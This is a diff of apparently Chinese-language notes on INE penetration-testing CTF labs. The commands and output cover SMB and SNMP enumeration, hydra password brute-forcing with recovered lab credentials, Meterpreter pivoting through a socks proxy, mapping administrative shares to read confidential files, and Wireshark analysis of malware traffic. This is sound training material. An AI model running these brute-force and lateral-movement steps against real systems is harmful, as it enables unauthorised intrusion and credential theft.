@@ -11,25 +11,25 @@
 		3389/tcp  open  ssl/ms-wbt-server?
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	以獲取有關協議的更多資訊 : 確定目標是Microsoft Windows Server 2008 R2 - 2012
-	nmap -sV -p 139,445 demo.ine.local
+		nmap -sV -p 139,445 demo.ine.local
 	快速辨識它smb-protocols : 
-	nmap -p445 --script smb-protocols demo.ine.local
-	nmap -p445 --script smb-security-mode demo.ine.local
+		nmap -p445 --script smb-protocols demo.ine.local
+		nmap -p445 --script smb-security-mode demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	匿名登入
-	smbclient -L  demo.ine.local
-	Enter WORKGROUP\root's password: <enter>
+		smbclient -L  demo.ine.local
+		Enter WORKGROUP\root's password: <enter>
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	來尋找所有目前使用者
-	nmap -p445 --script smb-enum-users.nse  demo.ine.local
-	
-	nano users.txt admin administrator guest root
-	查找所提供用戶的有效密碼
-	hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
-	
-	[445][smb] host: demo.ine.local   login: admin   password: tinkerbell
-	[445][smb] host: demo.ine.local   login: administrator   password: password1
-	[445][smb] host: demo.ine.local   login: root   password: elizabeth
+		nmap -p445 --script smb-enum-users.nse  demo.ine.local
+		nano users.txt admin administrator guest root
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 	查找所提供用戶的有效密碼
+		hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
+		
+		[445][smb] host: demo.ine.local   login: admin   password: tinkerbell
+		[445][smb] host: demo.ine.local   login: administrator   password: password1
+		[445][smb] host: demo.ine.local   login: root   password: elizabeth
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	meterpreter 會話
@@ -57,82 +57,82 @@
 	ping 10.0.29.163
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	新增路由並識別第二台機器服務 : 
-	run autoroute -s 10.0.29.163/20
+		run autoroute -s 10.0.29.163/20
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	啟動socks代理伺服器，使用proxychains工具存取攻擊者機器上的pivot系統
-	root@INE:~# cat /etc/proxychains4.conf
-	socks4  127.0.0.1 9050
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	background
-	use auxiliary/server/socks_proxy
-	show options
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	set SRVPORT 9050
-	set VERSION 4a 
-	exploit
-	jobs
-	  0   Auxiliary: server/socks_proxy
+		root@INE:~# cat /etc/proxychains4.conf
+		socks4  127.0.0.1 9050
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		background
+		use auxiliary/server/socks_proxy
+		show options
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		set SRVPORT 9050
+		set VERSION 4a 
+		exploit
+		jobs
+		  0   Auxiliary: server/socks_proxy
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	使用代理鏈運行 nmap 來識別樞軸機器上的 SMB 連接埠 (445)
-	proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
-	
-	445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
-	Service Info: OS: Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+		proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
+		
+		445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+		Service Info: OS: Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	sessions -i 1
-	shell
-	net view 10.0.29.163 (Access is denied.)
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	CTRL + C
-	migrate -N explorer.exe
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	shell
-	net view 10.0.29.163 
-	Documents   Disk                    
-	K           Disk  
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		sessions -i 1
+		shell
+		net view 10.0.29.163 (Access is denied.)
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		CTRL + C
+		migrate -N explorer.exe
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		shell
+		net view 10.0.29.163 
+		Documents   Disk                    
+		K           Disk  
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	使用「net」指令將共用磁碟機對應到機器 :
-	net use D: \\10.0.29.163\Documents
-	net use K: \\10.0.29.163\K$
+		net use D: \\10.0.29.163\Documents
+		net use K: \\10.0.29.163\K$
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	dir D:
-	dir K:
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	CTRL + C
-	cat D:\\Confidential.txt
-	cat D:\\FLAG2.txt
+		dir D:
+		dir K:
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		CTRL + C
+		cat D:\\Confidential.txt
+		cat D:\\FLAG2.txt
 # SNMP Analysis
 	nmap -sV -sC demo.ine.local
+ 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3389
-
-	[3389][rdp] host: demo.ine.local   login: administrator   password: elizabeth
+		[3389][rdp] host: demo.ine.local   login: administrator   password: elizabeth
 	xfreerdp /u:administrator /p:elizabeth /v:demo.ine.local:3389
-	type C:\FLAG1.txt
+		type C:\FLAG1.txt
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ping demo.ine.local
-	64 bytes from demo.ine.local (10.0.22.168): icmp_seq=1 ttl=125 time=6.72 ms
+		64 bytes from demo.ine.local (10.0.22.168): icmp_seq=1 ttl=125 time=6.72 ms
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap demo.ine.local
-	nmap -sU -p 161 demo.ine.local
-	161/udp open  snmp
-
+		nmap -sU -p 161 demo.ine.local
+		161/udp open  snmp
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	尋找社區字串(community string)
 	nmap -sU -p 161 --script=snmp-brute demo.ine.local
-	=> /usr/share/nmap/nselib/data/snmpcommunities.lst
-	| snmp-brute: 
-	|   public - Valid credentials
-	|   private - Valid credentials
-	|_  secret - Valid credentials
+		=> /usr/share/nmap/nselib/data/snmpcommunities.lst
+		| snmp-brute: 
+		|   public - Valid credentials
+		|   private - Valid credentials
+		|_  secret - Valid credentials
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	透過SNMP收集大量資訊。但是，這不是正確的可讀格式。我們需要藉助其他工具，即nmap SNMP腳本來取得具體資訊
 	snmpwalk -v 1 -c public demo.ine.local
 
 	nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output
-	發現了一些引人入勝的數據，例如正在運行的進程、用戶、服務、已安裝的應用程式等
-	//snmp-brute//snmp-sysdescr(version)//snmp-win32-services//snmp-processes
-	//snmp-win32-software//snmp-netstat//snmp-win32-users//snmp-interfaces
+		發現了一些引人入勝的數據，例如正在運行的進程、用戶、服務、已安裝的應用程式等
+		//snmp-brute//snmp-sysdescr(version)//snmp-win32-services//snmp-processes
+		//snmp-win32-software//snmp-netstat//snmp-win32-users//snmp-interfaces
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -190,15 +190,15 @@
 # Host & Network Penetration Testing: Network-Based Attacks CTF 1
 	識別返回 200 OK 回應代碼
 	過濾器：http.response.code == 200
-
-	
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Hypertext Transfer Protocol : Request URI
 	[Request URI: http://623start.site/?status=install]
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	識別受感染的 Windows 用戶端，請專注於透過 HTTP 的流量
 	過濾器：http
-	=> Windows Defender 的請求
-	Hypertext Transfer Protocol : GET /?status=start&av=Windows%20Defender HTTP/1.1\r\n
+		=> Windows Defender 的請求
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 	Hypertext Transfer Protocol : GET /?status=start&av=Windows%20Defender HTTP/1.1\r\n
 	(souce ip)
 	MAC 位址 : Ethernet II : Source: 80:86:5b:ab:1e:c4 (80:86:5b:ab:1e:c4)
 	
@@ -208,24 +208,24 @@
 	 過濾器：nbns
 	 
 	 NETBIOS Name Service> Queries
-	 DESKTOP-9PEA63H<20>: type NB, class IN
-	 => nbns, DESKTOP-9PEA63H
+		 DESKTOP-9PEA63H<20>: type NB, class IN
+		 => nbns, DESKTOP-9PEA63H
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	mymy_file.ps1 PowerShell 腳本
-	=> ctrl +f => Packet bytes => mystery_file.ps1
-	=> right-clicking > Printable Text
-	C:\Users\rwalters\Documents\mystery_file.ps1
+		=> ctrl +f => Packet bytes => mystery_file.ps1
+		=> right-clicking > Printable Text
+		C:\Users\rwalters\Documents\mystery_file.ps1
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	什麼 User-Agent 字串表示 PowerShell 腳本產生的流量
-	=> CTRL+F => Packet detail => string : PowerShell
+		=> CTRL+F => Packet detail => string : PowerShell
 	Hypertext Transfer Protocol  : 
 	User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.3031\r\n
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	哪個錢包擴充 ID 與 Coinbase 錢包關聯
-	=> ctrl +f => Packet bytes => Coinbase
-	=> Follow => TCP stream
-	=> Find coinbase
+		=> ctrl +f => Packet bytes => Coinbase
+		=> Follow => TCP stream
+		=> Find coinbase
 	hnfanknocfeofbddgcijnmhnfnkdnaad|Coinbase
 
 
